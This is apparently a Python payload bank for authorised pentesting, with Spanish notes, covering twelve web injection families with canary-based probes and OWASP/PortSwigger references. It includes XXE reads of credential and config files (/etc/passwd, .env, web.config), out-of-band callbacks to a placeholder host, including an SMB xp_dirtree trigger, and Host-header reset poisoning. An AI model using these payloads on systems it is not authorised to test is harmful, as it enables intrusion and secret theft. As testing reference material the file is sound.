"""Bancos de payloads crudos para las doce familias de inyección.

Cada bloque agrupa alternativas que se prueban POR SEPARADO. Las rutas de
lectura, callbacks y tiempos se limitan a activos propios o laboratorios
autorizados; una diferencia de respuesta no demuestra impacto por sí sola.
"""

PS_SQL = 'https://portswigger.net/web-security/sql-injection/cheat-sheet'
PS_SQL_BLIND = 'https://portswigger.net/web-security/sql-injection/blind'
PS_NOSQL = 'https://portswigger.net/web-security/nosql-injection'
PS_CMD = 'https://portswigger.net/web-security/os-command-injection'
PS_XXE = 'https://portswigger.net/web-security/xxe'
PS_XXE_BLIND = 'https://portswigger.net/web-security/xxe/blind'
PATT_XXE = 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md'
PS_SSTI = 'https://portswigger.net/web-security/server-side-template-injection'
OW_LDAP = 'https://wstg.owasp.org/v4.1/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection/'
OW_LDAP_ESCAPE = 'https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html'


def P(nivel, titulo, lenguaje, codigo, nota, fuente_url):
    return (nivel, titulo, lenguaje, codigo, nota, fuente_url)


BANCOS = {
    'sql-injection': [
        P('basicos', 'Sondas de tipo y comillas', 'text', r"""'
''
"
1 AND 1=1
1 AND 1=2
' AND '1'='1'-- -
' AND '1'='2'-- -""",
          'Enviar una línea por solicitud. Comparar el mismo registro propio y controlar validación/caché; en MySQL -- exige un espacio posterior, aquí seguido de -.', PS_SQL),
        P('basicos', 'Cierre y comentarios según motor', 'text', r"""'-- -
'#
'/*
1-- -
1#""",
          'Probar solo después de identificar el contexto. # es comentario de MySQL; /* sin cierre sirve únicamente si el resto de la consulta lo cierra.', PS_SQL),
        P('contextos', 'ORDER BY y UNION de dos columnas', 'sql', r"""' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,'prueba-123'-- -""",
          'Cada línea es alternativa independiente para una SELECT visible. Ajustar número y tipos de columnas; confirmar que el marcador no es simple reflejo.', PS_SQL),
        P('contextos', 'Predicados booleanos en texto y número', 'sql', r"""' AND '1'='1'-- -
' AND '1'='2'-- -
1 AND 1=1
1 AND 1=2
' AND SUBSTRING('prueba-123',1,1)='p'-- -""",
          'Usar el par verdadero/falso con idéntico resto de request. SUBSTRING es de ejemplo y puede requerir adaptar función y sintaxis al motor.', PS_SQL_BLIND),
        P('contextos', 'Funciones de versión sin consultar tablas de negocio', 'sql', r"""SELECT version()
SELECT @@version
SELECT sqlite_version()
SELECT banner FROM v$version""",
          'Consultas de referencia para PostgreSQL, MySQL/SQL Server, SQLite y Oracle, respectivamente; requieren punto de inyección compatible con SELECT.', PS_SQL),
        P('avanzados', 'Error condicionado o conversión de canary', 'sql', r"""SELECT CAST('prueba-123' AS INTEGER)
SELECT CONVERT(int,'prueba-123')
SELECT EXTRACTVALUE(1,CONCAT(0x5c,'prueba-123'))""",
          'Por separado: PostgreSQL, SQL Server y MySQL antiguo. Inducen error con literal propio; EXTRACTVALUE puede faltar en versiones actuales.', PS_SQL),
        P('avanzados', 'Retardos breves por motor', 'sql', r"""' AND (SELECT 1 FROM pg_sleep(1))=1-- -
' AND IF(1=1,SLEEP(1),0)-- -
'; WAITFOR DELAY '00:00:01'-- -""",
          'Por separado: PostgreSQL, MySQL y SQL Server. Solo con autorización de pruebas temporales; comparar varias muestras con control sin retardo.', PS_SQL),
        P('avanzados', 'OAST DNS sin datos de tablas', 'sql', r"""SELECT UTL_INADDR.get_host_address('prueba-123.{CONTROLLED_HOST}') FROM dual
EXEC master..xp_dirtree '\\prueba-123.{CONTROLLED_HOST}\a'""",
          'Oracle requiere privilegios/ACL. SQL Server puede iniciar SMB y exponer autenticación: usar solo laboratorio aislado y no recoger credenciales.', PS_SQL),
    ],
    'nosql-injection': [
        P('basicos', 'Operadores en campo que debería ser cadena', 'jsonl', r"""{"name":{"$ne":"prueba-inexistente"}}
{"name":{"$eq":"prueba-123"}}
{"name":{"$in":["prueba-123","prueba-456"]}}""",
          'Una línea JSON por solicitud sobre registros propios. Que el servidor acepte operadores puede ser funcionalidad documentada; comparar con cadena literal.', PS_NOSQL),
        P('basicos', 'Regex anclada y literal de control', 'jsonl', r"""{"name":"prueba-123"}
{"name":{"$regex":"^prueba-123$"}}
{"name":{"$regex":"^prueba-"}}""",
          'Solicitudes separadas. Acotar prefijos a datos propios; las regex no deben usarse para enumerar cuentas ajenas.', PS_NOSQL),
        P('contextos', 'Formulario con corchetes y operador', 'text', r"""name=prueba-123
name%5B%24ne%5D=prueba-inexistente
name%5B%24regex%5D=%5Eprueba-123%24""",
          'Cada línea es un cuerpo application/x-www-form-urlencoded. Solo aplica si el framework transforma corchetes en objetos; comparar con JSON y contrato de API.', PS_NOSQL),
        P('contextos', 'Tipos y selectores inesperados', 'jsonl', r"""{"name":true}
{"name":["prueba-123"]}
{"name":{"$exists":true}}
{"price":{"$gt":1,"$lt":3}}""",
          'Una línea por solicitud. Los tipos u operadores deben rechazarse si el contrato exige escalares; confirmar alteración real del filtro.', PS_NOSQL),
        P('avanzados', '$where sin efectos laterales en laboratorio', 'jsonl', r"""{"$where":"this.name === 'prueba-123'"}
{"$where":"this.name === 'prueba-inexistente'"}""",
          'Solo MongoDB con $where habilitado y permiso específico. El contraste se hace sobre un documento propio; no ejecutar bucles ni JavaScript externo.', PS_NOSQL),
    ],
    'command-injection': [
        P('basicos', 'Separadores POSIX con marcador', 'text', r"""127.0.0.1; printf prueba-123
127.0.0.1 && printf prueba-123
127.0.0.1 || printf prueba-123
127.0.0.1 | printf prueba-123""",
          'Una línea por prueba. && depende del éxito previo; || del fallo. Verificar salida del proceso y no simple reflejo del parámetro.', PS_CMD),
        P('basicos', 'Sustitución de comandos POSIX', 'text', r"""127.0.0.1$(printf prueba-123)
127.0.0.1`printf prueba-123`""",
          'Aplicable cuando el dato pasa por un shell y la sustitución cabe en el argumento; comparar con caracteres escapados.', PS_CMD),
        P('contextos', 'cmd.exe en Windows', 'text', r"""127.0.0.1 & echo prueba-123
127.0.0.1 && echo prueba-123
127.0.0.1 || echo prueba-123""",
          'Una línea por solicitud a un backend Windows que invoque cmd.exe. Los operadores condicionales dependen del código de salida previo.', PS_CMD),
        P('contextos', 'Salir de una cadena entre comillas', 'text', r"""127.0.0.1"; printf prueba-123; #
127.0.0.1'; printf prueba-123; #""",
          'Solo si se conoce el tipo de comilla en la línea de shell POSIX; adaptar cierre y comentario al contexto exacto.', PS_CMD),
        P('avanzados', 'Ciega con tiempo corto u OAST propio', 'text', r"""127.0.0.1; sleep 1
127.0.0.1 & ping -n 2 127.0.0.1
127.0.0.1; nslookup prueba-123.{CONTROLLED_HOST}""",
          'Pruebas separadas: POSIX, Windows y DNS. Solo con límites de tiempo/tráfico acordados; correlacionar frente a controles y no incluir datos sensibles en DNS.', PS_CMD),
    ],
    'xxe': [
        P('basicos', 'Control de entidad interna', 'xml', r"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY marca "prueba-123">]>
<root>&marca;</root>""",
          'Confirma solo soporte de DTD y expansión interna; no demuestra acceso a archivos ni red.', PS_XXE),
        P('basicos', 'Linux: archivo canary propio', 'xml', r"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///tmp/xxe-canary-{NONCE}.txt">]>
<root>&xxe;</root>""",
          'Crear antes el archivo de prueba en el laboratorio y buscar su contenido único en la respuesta. Cada bloque XML es un documento independiente.', PS_XXE),
        P('basicos', 'Linux: rutas de referencia', 'text', r"""file:///tmp/xxe-canary-{NONCE}.txt
file:///etc/hostname
file:///etc/hosts
file:///etc/os-release
file:///proc/version
file:///proc/self/cmdline
file:///proc/self/environ
file:///etc/passwd
file:///var/www/html/robots.txt
file:///var/www/html/config.php
file:///var/www/html/.env""",
          'Sustituir una ruta cada vez en SYSTEM y preferir canary. proc/self/environ, config.php y .env pueden contener secretos: solo laboratorio o permiso expreso; detenerse y redactar.', PATT_XXE),
        P('basicos', 'Windows: archivo canary propio', 'xml', r"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/xxe-lab/canary-{NONCE}.txt">]>
<root>&xxe;</root>""",
          'Crear C:\\xxe-lab\\canary-{NONCE}.txt en una VM propia; el URI file usa barras normales y C: como volumen.', PS_XXE),
        P('basicos', 'Windows: rutas de referencia', 'text', r"""file:///C:/xxe-lab/canary-{NONCE}.txt
file:///C:/Windows/win.ini
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/Windows/System32/inetsrv/config/applicationHost.config
file:///C:/inetpub/wwwroot/robots.txt
file:///C:/inetpub/wwwroot/web.config""",
          'Cambiar una ruta por documento. applicationHost.config y web.config pueden contener secretos: solo laboratorio o permiso expreso; no publicar contenido.', PATT_XXE),
        P('contextos', 'XXE hacia receptor HTTP propio', 'xml', r"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "https://{CONTROLLED_HOST}/xxe-{NONCE}">]>
<root>&xxe;</root>""",
          'Correlacionar callback del parser con la solicitud; escáner, navegador o prefetch pueden generar ruido.', PS_XXE),
        P('contextos', 'SSRF a servicio privado de laboratorio', 'xml', r"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://{IP_PRIVADA_LAB_PROPIA}:{PUERTO_LAB}/canary-{NONCE}">]>
<root>&xxe;</root>""",
          'Usar solo IP y puerto de un servicio propio; lectura de red no implica acceso a metadatos ni a cualquier red interna.', PS_XXE),
        P('contextos', 'Lista de destinos SSRF propios', 'text', r"""http://127.0.0.1:{PUERTO_LAB}/canary-{NONCE}
http://{IP_PRIVADA_LAB_PROPIA}:{PUERTO_LAB}/canary-{NONCE}
https://{CONTROLLED_HOST}/xxe-{NONCE}""",
          'Una URL por documento; probar solamente donde la política cubra el host y la red. El puerto debe servir un canary inocuo.', PS_XXE),
        P('contextos', 'XInclude cuando solo controlas un nodo', 'xml', r"""<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///tmp/xxe-canary-{NONCE}.txt" parse="text"/>
</root>""",
          'Requiere procesador XInclude habilitado; no es una DTD ni sustituye la prueba clásica si controlas el documento completo.', PS_XXE),
        P('contextos', 'SVG procesado por servidor', 'xml', r"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "https://{CONTROLLED_HOST}/svg-{NONCE}">]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="20">
  <text x="0" y="15">&xxe;</text>
</svg>""",
          'Solo si el backend analiza SVG. Una petición al abrir la imagen desde el navegador no demuestra XXE servidor.', PS_XXE),
        P('contextos', 'SOAP con Envelope y entidad válidos', 'xml', r"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "https://{CONTROLLED_HOST}/soap-{NONCE}">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><m:prueba xmlns:m="urn:prueba">&xxe;</m:prueba></soap:Body>
</soap:Envelope>""",
          'Un documento XML completo. El esquema SOAP o gateway puede rechazar DOCTYPE antes del parser; comparar con solicitud válida sin DTD.', PS_XXE),
        P('avanzados', 'Blind XXE: documento que carga DTD propia', 'xml', r"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "https://{CONTROLLED_HOST}/xxe-{NONCE}.dtd">
  %remote;
]>
<root>prueba-123</root>""",
          'Alojar el contenido DTD del bloque siguiente. Registrar solo callbacks, sin insertar contenido de archivos en URL.', PS_XXE_BLIND),
        P('avanzados', 'Blind XXE: contenido de la DTD externa', 'dtd', r"""<!ENTITY % callback SYSTEM "https://{CONTROLLED_HOST}/blind-{NONCE}">
%callback;""",
          'Archivo xxe-{NONCE}.dtd servido desde dominio propio. Si el parser permite entidades de parámetro externas, solicitará el callback.', PS_XXE_BLIND),
        P('avanzados', 'Error de recurso inexistente controlado', 'xml', r"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///tmp/xxe-inexistente-{NONCE}.txt">]>
<root>&xxe;</root>""",
          'Un error con la ruta puede revelar resolución externa; no asumir lectura de archivos por un error genérico.', PS_XXE_BLIND),
        P('avanzados', 'Wrapper PHP para canary binario', 'xml', r"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/tmp/xxe-canary-{NONCE}.txt">]>
<root>&xxe;</root>""",
          'Solo PHP/libxml y archivo propio en laboratorio. El wrapper puede estar bloqueado o no ser manejado por el parser.', PATT_XXE),
    ],
    'ssti': [
        P('basicos', 'Aritmética por familia de plantilla', 'text', r"""{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}""",
          'Una línea por solicitud; delimitadores corresponden a motores distintos. 49 repetible indica evaluación solo tras descartar transformación/reflejo.', PS_SSTI),
        P('basicos', 'Comparar literal con expresión', 'text', r"""prueba-123
{{7*7}}
{{7*"7"}}""",
          'La tercera línea ayuda a diferenciar semánticas: Jinja2 puede repetir una cadena, Twig suele calcular; confirmar con error o huella del motor.', PS_SSTI),
        P('contextos', 'Jinja2/Twig sin llamadas peligrosas', 'text', r"""{{(2+3)*4}}
{{'prueba-' ~ '123'}}
{{7*'7'}}""",
          'Cada línea es independiente. Ajustar comillas y filtros al motor; la evaluación matemática no demuestra acceso a objetos del servidor.', PS_SSTI),
        P('contextos', 'FreeMarker y ERB', 'text', r"""${(2+3)*4}
${"prueba-" + "123"}
<%= (2+3)*4 %>
<%= "prueba-" + "123" %>""",
          'Dos sintaxis separadas (Java FreeMarker y Ruby ERB), cada línea individual. Aplicar solo donde el motor esté identificado.', PS_SSTI),
        P('avanzados', 'Entrada dentro de una expresión existente', 'text', r"""}}
}}prueba-123{{
}}<b>prueba-123</b>{{""",
          'Solo cuando la aplicación inserta la entrada dentro de {{...}}. Son fragmentos para estudiar cierre de contexto, no documentos de plantilla completos.', PS_SSTI),
    ],
    'ldap-injection': [
        P('basicos', 'Valores de búsqueda y metacaracteres', 'text', r"""prueba-123
prueba*
*
(
)""",
          'Una línea por búsqueda en directorio propio. * puede ampliar resultados si el backend construye (uid={valor}); no usarlo para enumerar terceros.', OW_LDAP),
        P('basicos', 'Comparar wildcard con literal escapado', 'text', r"""prueba*
prueba\2a
(uid=prueba*)
(uid=prueba\2a)""",
          'Las dos primeras líneas son valores; las dos últimas filtros completos de laboratorio. RFC 4515 codifica * literal como \\2a.', OW_LDAP_ESCAPE),
        P('contextos', 'Filtros completos con AND y OR', 'ldap', r"""(&(objectClass=person)(uid=prueba-123))
(|(uid=prueba-123)(uid=prueba-456))
(&(uid=prueba-123)(!(uid=prueba-456)))""",
          'Un filtro por ejecución en laboratorio. Sirven para entender estructura prefija antes de adaptar fragmentos al punto de inyección.', OW_LDAP),
        P('contextos', 'Caracteres reservados según RFC 4515', 'text', r"""\2a  →  *
\28  →  (
\29  →  )
\5c  →  \
\00  →  NUL""",
          'Tabla de codificación, no payload único. Deben escaparse valores antes de insertarlos en filtros LDAP; DN usa reglas diferentes.', OW_LDAP_ESCAPE),
        P('avanzados', 'Predicados controlados para búsqueda ciega', 'ldap', r"""(&(uid=prueba-123)(cn=prueba-123))
(&(uid=prueba-123)(cn=prueba-inexistente))
(&(uid=prueba-123)(mail=prueba*@{DOMINIO_LAB}))""",
          'Filtros completos, uno por prueba, con atributos de cuenta propia. Solo una diferencia reproducible sobre datos propios apoya interpretación del filtro.', OW_LDAP),
    ],
}

OW_CRL = 'https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/15-HTTP_Response_Splitting/'
PS_HTTP_HEADER = 'https://portswigger.net/kb/issues/00200200_http-response-header-injection'
PS_IP = 'https://portswigger.net/kb/issues/00400110_spoofable-client-ip-address'
PS_HOST = 'https://portswigger.net/web-security/host-header/exploiting'
PS_CACHE = 'https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws'
PS_URL_OVERRIDE = 'https://portswigger.net/kb/issues/00400f00_request-url-override'
PS_MAIL = 'https://portswigger.net/kb/issues/00200800_smtp-header-injection'
OW_XPATH = 'https://wstg.owasp.org/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection/'
OW_CODE = 'https://wstg.owasp.org/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection/'

BANCOS.update({
    'crlf-injection': [
        P('basicos', 'Location con cabecera canary', 'text', r"""/ok%0d%0aX-Prueba:%20prueba-123
/ok%0aX-Prueba:%20prueba-123
/ok%0dX-Prueba:%20prueba-123""",
          'Cada línea es un valor para parámetro de redirección, no tres líneas de una respuesta. Inspeccionar cabeceras crudas; CRLF completo es el caso HTTP estándar.', OW_CRL),
        P('basicos', 'Control de doble codificación', 'text', r"""/ok%0d%0aX-Prueba:%20prueba-123
/ok%250d%250aX-Prueba:%20prueba-123
/ok-X-Prueba-prueba-123""",
          'Una línea por solicitud. La segunda solo se interpreta como salto si existe una segunda decodificación; el texto reflejado no es nueva cabecera.', OW_CRL),
        P('contextos', 'Nombre de archivo en Content-Disposition', 'text', r"""informe.txt%0d%0aX-Prueba:%20prueba-123
informe.txt%0aX-Prueba:%20prueba-123""",
          'Aplicable cuando el nombre se copia a una cabecera de descarga. Verificar si aparece X-Prueba como encabezado separado.', PS_HTTP_HEADER),
        P('contextos', 'Valor de cookie de respuesta', 'text', r"""es%0d%0aX-Prueba:%20prueba-123
es%0d%0aSet-Cookie:%20canary-{NONCE}=1;%20Path=/""",
          'Solo sobre sesión propia y cookie canary sin privilegios. El navegador puede filtrar Set-Cookie; confirmar en respuesta cruda y estado propio.', OW_CRL),
        P('avanzados', 'Límite cabecera-cuerpo en laboratorio', 'text', r"""/ok%0d%0aX-Prueba:%20prueba-123%0d%0a%0d%0aprueba-123
/ok%250d%250aX-Prueba:%20prueba-123%250d%250a%250d%250aprueba-123""",
          'Usar únicamente ruta y caché privados de laboratorio; un doble CRLF puede alterar cuerpo/respuesta. No atribuir contaminación de caché sin demostrarla aparte.', OW_CRL),
    ],
    'header-injection': [
        P('basicos', 'IP declarada por cabeceras de proxy', 'http', r"""X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
True-Client-IP: 127.0.0.1""",
          'Añadir una cabecera por solicitud de prueba. Solo hay impacto si una decisión protegida cambia; una página que muestra la IP declarada no basta.', PS_IP),
        P('basicos', 'Cabecera inocua de propagación', 'http', r"""X-Prueba: prueba-123
X-Request-ID: canary-{NONCE}""",
          'Una por solicitud. Sirve para localizar reflexión o propagación entre capas, no constituye por sí sola inyección explotable.', PS_HTTP_HEADER),
        P('contextos', 'Esquema y host reenviados', 'http', r"""X-Forwarded-Proto: http
X-Forwarded-Host: {CONTROLLED_HOST}
Forwarded: proto=http;host={CONTROLLED_HOST}""",
          'Probar por separado y comparar URL generada/Location bajo el mismo host de conexión. Solo confiar en estos campos desde proxies autenticados.', PS_HOST),
        P('contextos', 'Ruta reescrita por cabecera', 'http', r"""X-Original-URL: /ruta-canary-{NONCE}
X-Rewrite-URL: /ruta-canary-{NONCE}""",
          'Una cabecera por request a una ruta propia. Requiere demostrar que edge y backend discrepan sobre la ruta usada para autorización.', PS_URL_OVERRIDE),
        P('avanzados', 'Cabecera sin clave de caché', 'http', r"""X-Forwarded-Host: canary-{NONCE}.{CONTROLLED_HOST}
X-Host: canary-{NONCE}.{CONTROLLED_HOST}""",
          'En una URL privada de prueba, verificar reflexión y después HIT/MISS para la misma clave. No contaminar recursos compartidos.', PS_CACHE),
    ],
    'host-header-injection': [
        P('basicos', 'Host alternativo bajo conexión original', 'http', r"""Host: {ORIGEN}
Host: {CONTROLLED_HOST}""",
          'Son alternativas, nunca dos Host en esta prueba. Mantener conexión/SNI hacia el objetivo con un proxy y comparar Location o enlaces propios.', PS_HOST),
        P('basicos', 'Host reenviado', 'http', r"""Host: {ORIGEN}
X-Forwarded-Host: {CONTROLLED_HOST}""",
          'Estos dos campos van en la misma solicitud. Documentar si la aplicación genera URL hacia el host propio; el reflejo no demuestra envenenamiento de reset.', PS_HOST),
        P('contextos', 'Otras cabeceras de override', 'http', r"""X-Host: {CONTROLLED_HOST}
X-Forwarded-Server: {CONTROLLED_HOST}
X-HTTP-Host-Override: {CONTROLLED_HOST}
Forwarded: host={CONTROLLED_HOST};proto=https""",
          'Añadir una variante cada vez manteniendo Host legítimo. La precedencia depende del proxy y framework; no combinar sin necesidad.', PS_HOST),
        P('contextos', 'Puerto y validación del nombre', 'http', r"""Host: {ORIGEN}:8443
Host: {ORIGEN}.{CONTROLLED_HOST}
Host: {CONTROLLED_HOST}.{ORIGEN}""",
          'Una línea por request; la segunda es dominio propio que empieza por el host permitido, la tercera exige controlar un subdominio del objetivo. No inferir bypass por 200 genérico.', PS_HOST),
        P('avanzados', 'Host duplicado solo en laboratorio HTTP/1.1', 'http', r"""GET /canary-{NONCE} HTTP/1.1
Host: {ORIGEN}
Host: {CONTROLLED_HOST}""",
          'Solicitud deliberadamente ambigua y posiblemente rechazada. Usar conexión directa en laboratorio y comparar parsers; no enviar a infraestructura compartida.', PS_HOST),
        P('avanzados', 'Enlace absoluto de flujo propio', 'http', r"""POST /account/reset HTTP/1.1
Host: {ORIGEN}
X-Forwarded-Host: {CONTROLLED_HOST}
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO_URLENCODED}""",
          'Solo cuenta/correo propios. Inspeccionar el enlace recibido sin abrirlo en receptor ajeno ni publicar token; la generación de URL controlada debe demostrarse.', PS_HOST),
    ],
    'email-header-injection': [
        P('basicos', 'Cc y Bcc a buzones propios', 'text', r"""Prueba%0d%0aCc:%20{EMAIL_PROPIO_2}
Prueba%0d%0aBcc:%20{EMAIL_PROPIO_2}
Prueba%0aCc:%20{EMAIL_PROPIO_2}""",
          'Cada línea es un valor de campo, no un mensaje completo. Enviar una sola notificación de prueba a direcciones propias y revisar fuente MIME cruda.', PS_MAIL),
        P('basicos', 'Control literal y doble codificación', 'text', r"""Prueba-Cc-{EMAIL_PROPIO_2}
Prueba%250d%250aCc:%20{EMAIL_PROPIO_2}
Prueba%0d%0aX-Prueba:%20canary-{NONCE}""",
          'El control separa reflejo de nueva cabecera. Doble codificación solo funciona si hay doble decodificación; X-Prueba evita añadir destinatarios.', PS_MAIL),
        P('contextos', 'Campo de asunto de formulario', 'text', r"""Consulta%0d%0aX-Prueba:%20canary-{NONCE}
Consulta%0d%0aReply-To:%20{EMAIL_PROPIO_2}""",
          'Probar solo si el asunto se inserta en cabeceras sin API estructurada. Confirmar mensaje crudo y que Reply-To apunta a buzón propio.', PS_MAIL),
        P('contextos', 'Nombre visible o dirección de remitente', 'text', r"""Nombre%0d%0aX-Prueba:%20canary-{NONCE}
Nombre%0d%0aCc:%20{EMAIL_PROPIO_2}""",
          'Aplicable a campos que el backend coloca en From/Reply-To. Bibliotecas de correo modernas suelen rechazar CR/LF.', PS_MAIL),
        P('avanzados', 'Separación de cabecera y cuerpo', 'text', r"""Prueba%0d%0aX-Prueba:%20canary-{NONCE}%0d%0a%0d%0acuerpo-canary-{NONCE}
Prueba%250d%250aX-Prueba:%20canary-{NONCE}%250d%250a%250d%250acuerpo-canary-{NONCE}""",
          'Solo mensaje de laboratorio hacia buzones propios. Comprobar si el cuerpo quedó alterado; no usar adjuntos ni correos a terceros.', PS_MAIL),
    ],
    'xpath-injection': [
        P('basicos', 'Comillas y booleanos de control', 'text', r"""'
"
prueba' or '1'='1
prueba' or '1'='2""",
          'Un valor por request. Las dos últimas asumen un predicado con comilla simple, como [name=\'...\']; comparar nodos propios y no solo errores.', OW_XPATH),
        P('basicos', 'Predicado numérico', 'xpath', r"""1 or 1=1
1 or 1=2
1 and 1=1
1 and 1=2""",
          'Fragmentos alternativos para un contexto numérico no entrecomillado. El resultado depende de cómo la aplicación arme la expresión.', OW_XPATH),
        P('contextos', 'Funciones XPath 1.0 sobre marcador propio', 'xpath', r"""prueba' or starts-with(name,'prueba') or 'a'='b
prueba' or contains(name,'prueba-123') or 'a'='b
prueba' or string-length(name)=10 or 'a'='b""",
          'Cada línea presupone que el valor cae dentro de comillas simples en un predicado; adaptar nombre de nodo y longitud a XML propio.', OW_XPATH),
        P('contextos', 'Expresiones completas en XML de laboratorio', 'xpath', r"""//item[name='prueba-123']
//item[starts-with(name,'prueba-')]
count(//item[name='prueba-123'])
boolean(//item[name='prueba-123'])""",
          'Son expresiones completas de referencia, una por evaluación. No confundir capacidad normal del evaluador con entrada inyectable.', OW_XPATH),
        P('avanzados', 'Pares ciegos por longitud controlada', 'xpath', r"""//item[name='prueba-123' and string-length(name)=10]
//item[name='prueba-123' and string-length(name)=11]""",
          'Usar documento propio con nombre de longitud conocida; diferencia repetible requiere que la entrada controle la expresión, no solo datos.', OW_XPATH),
    ],
    'code-injection': [
        P('basicos', 'Aritmética sin efectos', 'text', r"""7*7
(2+3)*4
7+7
prueba-123""",
          'Una línea por solicitud a campo de expresión. Contrastar evaluación con reflejo y cálculo funcional previsto; 49 por sí solo no implica RCE.', OW_CODE),
        P('basicos', 'Controles por tipo de entrada', 'jsonl', r"""{"formula":"7*7"}
{"formula":"(2+3)*4"}
{"formula":"prueba-123"}""",
          'Una línea JSON por request. Aplicar solo si la API anuncia fórmulas o reglas; un parser matemático restringido puede evaluar sin code injection.', OW_CODE),
        P('contextos', 'JavaScript/Node.js: capacidad de expresión', 'javascript', r"""Math.max(2,3)
"prueba-" + "123"
typeof process""",
          'Cada línea se evalúa por separado en laboratorio. typeof process distingue entorno Node, pero su presencia no demuestra acceso a archivos o ejecución de comandos.', OW_CODE),
        P('contextos', 'Python: expresión frente a sentencia', 'python', r"""sum([2,3])
"prueba-" + "123"
1 if True else 0""",
          'Para eval de Python; exec acepta también sentencias. Funciones pueden estar restringidas y una fórmula legítima no es vulnerabilidad por sí sola.', OW_CODE),
        P('avanzados', 'PHP eval con salida inocua', 'php', r"""echo 7*7;
print('prueba-123');""",
          'Una sentencia por prueba en un laboratorio PHP donde la entrada llegue a eval. Confirmar que la salida proviene del servidor, no del navegador.', OW_CODE),
        P('avanzados', 'Disponibilidad de funciones sin invocarlas', 'text', r"""typeof require
typeof process
callable(__import__)
'eval' in globals()""",
          'Las dos primeras son JavaScript/Node; las dos últimas Python. Solo sondas de capacidad en entorno aislado: no importan módulos ni leen datos.', OW_CODE),
    ],
})
